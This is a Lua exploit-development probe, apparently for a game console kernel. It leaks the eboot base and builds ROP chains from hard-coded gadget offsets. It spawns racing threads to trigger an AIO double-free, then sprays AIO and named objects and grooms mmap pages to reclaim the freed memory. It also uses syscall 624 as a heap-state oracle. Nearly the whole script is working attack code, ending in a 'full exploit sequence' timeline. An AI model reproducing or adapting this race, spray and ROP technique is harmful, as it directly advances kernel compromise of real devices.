-- CRASH_CLASS: MODERATE
-- PROBE 68d: sys 624 VM-op counter as heap manipulation oracle
--
-- 52b established: 624 is a monotonic VM-op counter.
--   +5 per mmap, +0 per munmap, +0 per socket/kqueue/memory.alloc
--   Zero jitter across 100 tight samples.
--
-- KEY QUESTION: Can 624 detect slab-level events during AIO double-free?
-- AIO objects are slab-allocated (0x58 bytes from zone 0x1ab5900), and
-- 52b showed socket creation (also slab) gives delta=0. So the hypothesis
-- is that slab alloc/free is invisible to 624, BUT slab page backing
-- changes (when the zone allocator requests a fresh VM page) might be
-- visible as a step.
--
-- This probe measures:
-- [A] 624 delta for each AIO operation (submit, poll, delete) individually
-- [B] 624 delta for the double-free race itself
-- [C] 624 delta for high-volume AIO spray (128+ submits)
-- [D] Whether a burst of AIO submits ever causes a VM page allocation
--     visible to 624 (slab exhaustion → new page from VM)
-- [E] Compare 624 deltas for: namedobj(557), evf(538), pipe, shm_open
--     to see if any slab spray touches the VM counter
-- [F] Use 624 as mmap grooming verification

print("=== PROBE 68d: 624 HEAP ORACLE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSEGV(11), SIGSYS(12), SIGPIPE(13)
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- 624 reader
local function read_624()
    local r = mk(624)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    return N(r)
end

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(1))         -- cmd=1 (read)
    wq(N(reqs_b) + 8, uint64(16))    -- nbytes
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_664(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end
local function delete_662(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- =========================================================
-- [A] 624 DELTA FOR INDIVIDUAL AIO OPERATIONS
-- =========================================================
print("")
print("--- [A] 624 delta per AIO operation ---")

local c0 = read_624()
local id1 = submit_one()
local c1 = read_624()
print(string.format("  669 submit:  delta=%+d  (id=0x%X)", c1 - c0, id1))

local c2 = read_624()
poll_664(id1)
local c3 = read_624()
print(string.format("  664 poll:    delta=%+d", c3 - c2))

local c4 = read_624()
local st1 = delete_662(id1)
local c5 = read_624()
print(string.format("  662 delete:  delta=%+d  (state=0x%X)", c5 - c4, st1))

-- =========================================================
-- [B] 624 DELTA FOR BATCH SUBMIT (1..128)
-- =========================================================
print("")
print("--- [B] 624 delta for batch submit (1..128) ---")

local batch_sizes = {1, 4, 16, 32, 64, 128}
for _, bs in ipairs(batch_sizes) do
    if not alive() then print("  DEAD"); break end

    local bc0 = read_624()
    local batch_ids = {}
    for i = 1, bs do
        local bid = submit_one()
        if bid ~= 0 then table.insert(batch_ids, bid) end
    end
    local bc1 = read_624()
    local submit_delta = bc1 - bc0

    -- poll all
    for _, bid in ipairs(batch_ids) do poll_664(bid) end
    local bc2 = read_624()
    local poll_delta = bc2 - bc1

    -- delete all
    for _, bid in ipairs(batch_ids) do delete_662(bid) end
    local bc3 = read_624()
    local del_delta = bc3 - bc2

    print(string.format("  n=%3d: submit_delta=%+d  poll_delta=%+d  del_delta=%+d  (got=%d)",
        bs, submit_delta, poll_delta, del_delta, #batch_ids))
end

if not alive() then print("DEAD at B"); return end

-- =========================================================
-- [C] 624 DELTA FOR DOUBLE-FREE RACE
-- =========================================================
print("")
print("--- [C] 624 delta during double-free race ---")

local BATCH = 16
local del_ids  = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

for trial = 1, 5 do
    if not alive() then print("  DEAD"); break end

    -- Submit + poll
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_664(id); table.insert(ids, id) end
    end
    local count = #ids
    if count == 0 then break end

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Child A
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Child B
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- thr_param structs
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    -- ★ Measure 624 around the race
    local race_before = read_624()

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for children
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local race_after = read_624()

    -- Count doubles
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    print(string.format("  trial %d: doubles=%d  624 delta=%+d  (before=%d after=%d)",
        trial, doubles, race_after - race_before, race_before, race_after))
end

if not alive() then print("DEAD at C"); return end

-- =========================================================
-- [D] 624 DELTA FOR CROSS-SUBSYSTEM SLAB OBJECTS
-- =========================================================
print("")
print("--- [D] 624 delta for non-AIO slab objects ---")

-- namedobj(557): creates 0x20+ byte objects from handle table
local d0 = read_624()
local nobj_ids = {}
for i = 1, 32 do
    local np = put_str(string.format("test_%04d", i))
    local ok, r = pcall(function()
        return mk(557)(uint64(N(np)), uint64(0), uint64(0))
    end)
    if ok and r then
        local rv = sgn(r)
        if rv >= 0 then table.insert(nobj_ids, rv) end
    end
end
local d1 = read_624()
print(string.format("  namedobj(557) x%d: delta=%+d", #nobj_ids, d1 - d0))

-- Delete namedobjs
local d2 = read_624()
for _, nid in ipairs(nobj_ids) do
    pcall(function() mk(558)(uint64(nid)) end)
end
local d3 = read_624()
print(string.format("  namedobj_delete(558) x%d: delta=%+d", #nobj_ids, d3 - d2))

-- evf(538): creates evf objects
local d4 = read_624()
local evf_ids = {}
for i = 1, 32 do
    local ep = put_str(string.format("evf_%04d", i))
    local ok, r = pcall(function()
        return mk(538)(uint64(N(ep)), uint64(0x100), uint64(0))
    end)
    if ok and r then
        local rv = sgn(r)
        if rv >= 0 then table.insert(evf_ids, rv) end
    end
end
local d5 = read_624()
print(string.format("  evf(538) x%d: delta=%+d", #evf_ids, d5 - d4))

-- Delete evfs
local d6 = read_624()
for _, eid in ipairs(evf_ids) do
    pcall(function() mk(541)(uint64(eid)) end)
end
local d7 = read_624()
print(string.format("  evf_delete(541) x%d: delta=%+d", #evf_ids, d7 - d6))

-- pipe(42) via socketpair
local d8 = read_624()
local pipe_fds = {}
for i = 1, 32 do
    local pb = memory.alloc(8)
    local ok, r = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(pb)))
    end)
    if ok then
        local f0 = rd(N(pb)) or -1
        local f1 = rd(N(pb) + 4) or -1
        if f0 >= 0 then table.insert(pipe_fds, {f0, f1}) end
    end
end
local d9 = read_624()
print(string.format("  socketpair(135) x%d: delta=%+d", #pipe_fds, d9 - d8))

-- close socketpairs
local d10 = read_624()
for _, pair in ipairs(pipe_fds) do
    pcall(function() mk(6)(uint64(pair[1])) end)
    pcall(function() mk(6)(uint64(pair[2])) end)
end
local d11 = read_624()
print(string.format("  close_pairs x%d: delta=%+d", #pipe_fds, d11 - d10))

-- shm_open(482)
local d12 = read_624()
local shm_fds = {}
for i = 1, 16 do
    local sp = put_str(string.format("/shm_test_%04d", i))
    local ok, r = pcall(function()
        return mk(482)(uint64(N(sp)), uint64(0x602), uint64(0x1FF))
    end)
    if ok and r then
        local rv = sgn(r)
        if rv >= 0 then table.insert(shm_fds, rv) end
    end
end
local d13 = read_624()
print(string.format("  shm_open(482) x%d: delta=%+d", #shm_fds, d13 - d12))

-- close shm fds
local d14 = read_624()
for _, sfd in ipairs(shm_fds) do
    pcall(function() mk(6)(uint64(sfd)) end)
end
local d15 = read_624()
print(string.format("  shm_close x%d: delta=%+d", #shm_fds, d15 - d14))

if not alive() then print("DEAD at D"); return end

-- =========================================================
-- [E] HIGH-VOLUME SLAB STRESS: does 624 ever step?
-- =========================================================
print("")
print("--- [E] High-volume slab stress (500 namedobj) ---")

-- Create 500 namedobjs in batches of 50, measure 624 after each batch
local prev_624 = read_624()
local big_nobj = {}
local steps = {}
for batch = 1, 10 do
    if not alive() then break end
    for i = 1, 50 do
        local np = put_str(string.format("stress_%05d", (batch - 1) * 50 + i))
        local ok, r = pcall(function()
            return mk(557)(uint64(N(np)), uint64(0), uint64(0))
        end)
        if ok and r then
            local rv = sgn(r)
            if rv >= 0 then table.insert(big_nobj, rv) end
        end
    end
    local cur_624 = read_624()
    local delta = cur_624 - prev_624
    table.insert(steps, delta)
    if delta ~= 0 then
        print(string.format("  batch %d (n=%d): 624 delta=%+d *** STEP ***", batch, #big_nobj, delta))
    end
    prev_624 = cur_624
end

local total_steps = 0
for _, s in ipairs(steps) do total_steps = total_steps + s end
print(string.format("  total 500 namedobj: 624 total_delta=%+d  any_step=%s",
    total_steps, total_steps ~= 0 and "YES" or "NO"))

-- Cleanup
for _, nid in ipairs(big_nobj) do
    pcall(function() mk(558)(uint64(nid)) end)
end

if not alive() then print("DEAD at E"); return end

-- =========================================================
-- [F] 624 AS MMAP GROOMING VERIFICATION
-- =========================================================
print("")
print("--- [F] 624 as mmap grooming verification ---")

-- Demonstrate: map N pages, verify 624 delta = N*5
local groom_sizes = {1, 4, 16, 64}
for _, gs in ipairs(groom_sizes) do
    if not alive() then break end
    local g0 = read_624()
    local addrs = {}
    for i = 1, gs do
        local ok, r = pcall(function()
            return mk(477)(uint64(0), uint64(0x4000), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)
        if ok and r then
            local rv = N(r)
            if rv ~= 0 and rv ~= 0xFFFFFFFF then
                table.insert(addrs, rv)
            end
        end
    end
    local g1 = read_624()
    local expected = gs * 5
    local actual = g1 - g0
    local ok_str = (actual == expected) and "MATCH" or "MISMATCH"
    print(string.format("  %d mmaps: expected_delta=%d actual_delta=%d -> %s (mapped=%d)",
        gs, expected, actual, ok_str, #addrs))

    -- Unmap
    for _, addr in ipairs(addrs) do
        pcall(function() mk(73)(uint64(addr), uint64(0x4000)) end)
    end
end

-- =========================================================
-- [G] 624 DURING FULL EXPLOIT SEQUENCE
-- =========================================================
print("")
print("--- [G] 624 timeline during exploit sequence ---")

if not alive() then print("DEAD at G"); return end

local timeline = {}
local function ts(label)
    local v = read_624()
    table.insert(timeline, {label=label, val=v})
    return v
end

ts("start")

-- Step 1: submit 16 AIO
local gids = {}
for i = 1, 16 do
    local id = submit_one()
    if id ~= 0 then table.insert(gids, id) end
end
ts("after_16_submit")

-- Step 2: poll all
for _, gid in ipairs(gids) do poll_664(gid) end
ts("after_16_poll")

-- Step 3: race (2 children)
local gcount = #gids
if gcount > 0 then
    for i = 0, gcount - 1 do
        wd(N(del_ids) + i * 4, gids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    local stk_GA = memory.alloc(0x4000)
    local sb_GA = N(stk_GA)
    local rsp_GA = sb_GA + 0x2000 - ((sb_GA + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_GA + i, 0) end
    local oGA = 0
    local function emGA(v) wq(rsp_GA + oGA, v); oGA = oGA + 8 end
    emGA(g_pop_rax); emGA(uint64(0x41))
    emGA(g_pop_rdi); emGA(uint64(N(marker_A)))
    emGA(g_mov_m_rax)
    emGA(g_pop_rdi); emGA(uint64(N(del_ids)))
    emGA(g_pop_rsi); emGA(uint64(gcount))
    emGA(g_pop_rdx); emGA(uint64(N(states_A)))
    emGA(g_pop_rax); emGA(uint64(662))
    emGA(stub)
    emGA(g_pop_rdi); emGA(uint64(0))
    emGA(g_pop_rax); emGA(uint64(431))
    emGA(stub)

    local stk_GB = memory.alloc(0x4000)
    local sb_GB = N(stk_GB)
    local rsp_GB = sb_GB + 0x2000 - ((sb_GB + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_GB + i, 0) end
    local oGB = 0
    local function emGB(v) wq(rsp_GB + oGB, v); oGB = oGB + 8 end
    emGB(g_pop_rax); emGB(uint64(0x42))
    emGB(g_pop_rdi); emGB(uint64(N(marker_B)))
    emGB(g_mov_m_rax)
    emGB(g_pop_rdi); emGB(uint64(N(del_ids)))
    emGB(g_pop_rsi); emGB(uint64(gcount))
    emGB(g_pop_rdx); emGB(uint64(N(states_B)))
    emGB(g_pop_rax); emGB(uint64(662))
    emGB(stub)
    emGB(g_pop_rdi); emGB(uint64(0))
    emGB(g_pop_rax); emGB(uint64(431))
    emGB(stub)

    local pGA = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pGA) + i, 0) end
    wq(N(pGA), g_bare_ret)
    wq(N(pGA) + 0x10, uint64(sb_GA))
    wq(N(pGA) + 0x18, uint64(0x2000))
    local tGA = memory.alloc(8); wq(N(tGA), uint64(0))
    wq(N(pGA) + 0x30, tGA)

    local pGB = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pGB) + i, 0) end
    wq(N(pGB), g_bare_ret)
    wq(N(pGB) + 0x10, uint64(sb_GB))
    wq(N(pGB) + 0x18, uint64(0x2000))
    local tGB = memory.alloc(8); wq(N(tGB), uint64(0))
    wq(N(pGB) + 0x30, tGB)

    ts("before_race")
    pcall(function() mk(455)(pGA, uint64(0x38)) end)
    pcall(function() mk(455)(pGB, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(dbuf)) end
    ts("after_race")

    local gdoubles = 0
    for i = 0, gcount - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then gdoubles = gdoubles + 1 end
    end
    print(string.format("  race doubles: %d", gdoubles))
end

-- Step 4: spray 128 AIO (reclaim attempt)
if alive() then
    local spray_ids = {}
    for i = 1, 128 do
        if not alive() then break end
        local id = submit_one()
        if id ~= 0 then table.insert(spray_ids, id) end
    end
    ts("after_128_spray")

    -- Step 5: spray 64 namedobj (cross-subsystem reclaim attempt)
    local nobj2 = {}
    for i = 1, 64 do
        if not alive() then break end
        local np = put_str(string.format("rcl_%05d", i))
        local ok, r = pcall(function()
            return mk(557)(uint64(N(np)), uint64(0), uint64(0))
        end)
        if ok and r then
            local rv = sgn(r)
            if rv >= 0 then table.insert(nobj2, rv) end
        end
    end
    ts("after_64_namedobj")

    -- Step 6: map 4 pages (groom reference)
    for i = 1, 4 do
        pcall(function()
            mk(477)(uint64(0), uint64(0x4000), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)
    end
    ts("after_4_mmap")

    -- Cleanup sprayed AIO
    for _, sid in ipairs(spray_ids) do
        if alive() then poll_664(sid) end
    end
    for _, sid in ipairs(spray_ids) do
        if alive() then delete_662(sid) end
    end
    ts("after_cleanup")

    -- Cleanup namedobj
    for _, nid in ipairs(nobj2) do
        pcall(function() mk(558)(uint64(nid)) end)
    end
end

-- Print timeline
print("")
print("  TIMELINE:")
for i, t in ipairs(timeline) do
    local delta = 0
    if i > 1 then delta = t.val - timeline[i - 1].val end
    print(string.format("    %-25s val=%d  delta=%+d", t.label, t.val, delta))
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 68d COMPLETE ===")
